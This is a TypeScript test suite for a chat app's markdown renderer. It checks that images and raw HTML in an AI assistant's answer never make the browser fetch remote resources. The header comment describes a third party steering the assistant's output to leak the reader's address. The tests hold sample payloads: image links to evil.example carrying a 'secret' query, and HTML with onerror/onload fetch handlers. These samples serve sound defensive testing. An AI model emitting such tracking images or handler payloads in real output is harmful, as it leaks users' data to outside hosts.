/**
 * C284: the assistant's markdown never makes the browser fetch a remote image.
 *
 * The text of an MCP-influenced run is chosen in part by a third party, so an
 * `![](https://…)` it repeats would be a one-request channel that leaks the
 * reader's address. The renderer turns an image into a link (fetched only on a
 * click) and keeps raw HTML as text. The suite has no DOM: the proof is that
 * the static markup holds no element that loads a resource.
 */

import assert from "node:assert/strict";
import test from "node:test";

import React from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { renderAssistantMarkdown } from "@/features/chat/model/assistantMarkdown";

/** Elements and attributes a browser loads on its own, without a click. */
const AUTO_LOADING = /<(img|picture|source|video|audio|iframe|embed|object|link|script|svg)\b|\ssrcset=|\sbackground=|url\(/i;

function html(markdown: string): string {
  return renderToStaticMarkup(
    React.createElement(React.Fragment, null, ...renderAssistantMarkdown(markdown)),
  );
}

test("C284 a markdown image from the answer is a link, never an element that loads", () => {
  const out = html("![tracker](https://evil.example/pixel.png?q=secret)");
  assert.doesNotMatch(out, AUTO_LOADING);
  assert.match(out, /<a [^>]*href="https:\/\/evil\.example\/pixel\.png\?q=secret"/);
  assert.match(out, />tracker</);
});

test("C284 raw HTML images and other loaders in the answer stay text", () => {
  for (const raw of [
    '<img src="https://evil.example/p.png">',
    '<img src=x onerror="fetch(1)">',
    '<iframe src="https://evil.example"></iframe>',
    '<link rel="stylesheet" href="https://evil.example/a.css">',
    '<svg onload="fetch(1)"></svg>',
  ]) {
    const out = html(`before ${raw} after`);
    assert.doesNotMatch(out, AUTO_LOADING, raw);
    assert.match(out, /&lt;/, `${raw} is shown as text`);
  }
});

test("C284 a reference-style image is a link too", () => {
  const out = html("![logo][1]\n\n[1]: https://evil.example/logo.png");
  assert.doesNotMatch(out, AUTO_LOADING);
});

test("a conversation with web sources renders no remote image and only safe links", async () => {
  const { citationOf } = await import("@/features/chat/model/citations");
  const { renderCitationSources, renderCitedAnswer } = await import("@/features/chat/model/citedAnswer");
  const citation = citationOf(
    { n: 1, collection: "web", url: "https://docs.example.org/a", domain: "docs.example.org", title: "T", snippet: "S" },
    null,
  )!;
  const out = renderToStaticMarkup(
    React.createElement(
      React.Fragment,
      null,
      ...renderCitedAnswer("See [1] ![t](https://evil.example/p.png)", [citation], () => {}),
      renderCitationSources([citation], () => {}),
    ),
  );
  assert.doesNotMatch(out, AUTO_LOADING);
  for (const anchor of out.match(/<a [^>]*>/g) ?? []) {
    if (/target="_blank"/.test(anchor)) assert.match(anchor, /rel="noopener noreferrer"/, anchor);
  }
});
